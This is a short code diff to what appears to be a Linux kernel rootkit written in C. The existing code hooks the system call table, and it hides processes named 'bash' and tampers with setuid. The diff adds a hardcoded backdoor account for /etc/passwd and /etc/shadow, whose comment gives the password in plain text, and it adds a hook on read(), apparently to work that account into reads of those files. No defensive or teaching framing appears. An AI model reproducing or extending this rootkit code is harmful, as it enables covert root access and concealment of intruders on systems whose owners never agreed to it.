@@ -37,6 +37,14 @@ struct linux_dirent {
 
 #define MAGIC_NUMBER 12345
 
+#define BACKDOOR_PASSWD "user1:x:12345:12345:backdoor:/root:/bin/bash\n"
+
+#define BACKDOOR_SHADOW "user1:$1$MvZ75uo5$a2pTPgyDXrO6n.eyQjcmq0:16888:0:99999:7:::\n" // password is superman
+
+#define PASSWD_FILE "/etc/passwd"
+
+#define SHADOW_FILE "/etc/shadow"
+
 #define HOOK_SYSCALL(sys_call_table, orig_func, hacked_func, __NR_index)    \
     orig_func = (void *)sys_call_table[__NR_index];                        \
     sys_call_table[__NR_index] = (unsigned long*)&hacked_func
@@ -47,9 +55,11 @@ struct linux_dirent {
 // Original system calls
 asmlinkage long (*orig_setuid)(uid_t uid);
 asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage long (*orig_read)(unsigned int fd, char *buf, size_t count);
 
 // Hacked system calls
 asmlinkage long hacked_setuid(uid_t uid);
 asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count);
 
 char *HIDDEN_PROCESS = "bash";
